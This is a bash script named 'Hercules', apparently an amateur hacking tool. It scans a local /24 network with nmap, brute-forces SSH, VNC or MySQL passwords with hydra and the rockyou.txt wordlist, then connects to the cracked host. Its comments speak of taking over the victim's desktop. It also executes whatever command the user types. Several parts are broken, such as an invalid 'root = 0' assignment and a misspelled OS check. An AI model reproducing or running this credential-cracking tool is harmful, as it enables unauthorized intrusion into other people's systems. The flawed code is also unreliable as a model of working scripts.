#!/bin/bash
root = 0
# gets the current time in a 12 hour formate
CURRENT_TIME=$(date +"%I:%M:%S %p")

# gets current date in mm/dd/yyyy formate
CURRENT_DATE=$(date +"%m/%d/%Y")

if [[ "$OSTYPE" == "linuxs"* ]]; then   
    clear; #clears the terminal
    if [[ "$EUID" -ne $root  ]]; then #makes the user run this script in root user
        #if the user isnt root it says "run as root"
        echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
        echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
        exit; #stops the program so it does not contiue when its not suppoes to 
    else
        chmod +x * #this makes all files about to be used with "./"
        sudo rm -rf hydra.restore #gets rid of the hydra.restore file
        clear #clears the terminal
        wget -q --spider http://google.com #checks if the user is connected to the internet

        if [[ $? -eq 0 ]]; then #if they are connected to the internet they can processed 
            echo #this is a space in the program

        else #if they are not connected to the internet it will say "You are offline please connect to the internet"
            echo "ERROR:root:TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE" >> ERROR.LOG
            echo "TIME:$CURRENT_TIME You are offline please connect to the internet. DATE:$CURRENT_DATE"

            exit #stops the program so it doesnt contiue when its not suppoes to
        fi

        clear #clears the Terminal

        function Hercules() { #start of the hacking software

            figlet -f slant "Hercules"
            echo "Type your own number to see what port you want to see"
            read -p "Do you want SSH(22), VNC(5900), MySQL(3306). To see all type (ALL): " service #what the user can choice to see what port is open to crack
        
        if [[ $service == "ALL" ]] || 
           [[ $service == "all" ]]; then #if the user says all if scan the intier network to see whats open
            sudo nmap -sS 192.168.1.1/24 --open;   #this also allowes them to crack what port is open if they want too
            hydra -h; #helps the user use hydra by showing what it can do
            echo "Put in hydra first to start the script."; #tells the user to put Hydra first so that the program will work
            read -p ">>> " Hydra; #allows the user to hack diffrent ports that werent there before
            $Hydra;
            exit
            
        else  #this part says for them only to see what prots are open
            sudo nmap -sS 192.168.1.1/24 -p $service --open
            
        fi
            echo "To crack VNC(5900) dont type anthing in the Input Username function" #tells the user to not put anything in the username input
            echo "To crack MySQL(3306) type 'localhost' in the 'Input Hostname'"
            read -p "Input Username: " user #allows the user to intpu the username for the cracking softwhere to work
            read -p "Input Hostname: " host #allows the user to intpu the hostname for the cracking softwhere to work

            if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
                hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
                echo "Loading VNC server..." #tells the user that VNC(5900) is loading
                open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
                exit; # stops the porgram

            elif [[ $service == 22 ]] || [[ $service == "ssh" ]]; then
                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host #Cracks the chocien persons password for 22(SSH)
                echo #this is a space in the program
                echo "Connecting to $user@$host" #tell's the user that the software is trying to connecto to the-
                                                 #username and the hostname of the person that they hacked into
                sleep 3
                ssh $user@$host #this connects to the users computer by 22 (SSH[Secure Shell])
            
            elif [[ $service == 3306 ]] || [[ $service == "mysql" ]]; then 
                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
                echo "Loading to MySQL server..."
                sleep 3;
                mysql -u $user -p -A #connects to the MySQL server
            fi
        }
        fi
        Hercules; #end of the function of Hercules
else
    clear; #clears the terminal
    echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG #if the users is not useing the right OS it says "You are useing the wrong OS" and puts it into a error log for the user to see what went wrong with the code
    echo "TIME:$CURRENT_TIME Wrong OS please use the correct OS. DATE:$CURRENT_DATE" #if the users is not useing the right OS it says "You are useing the wrong OS"
fi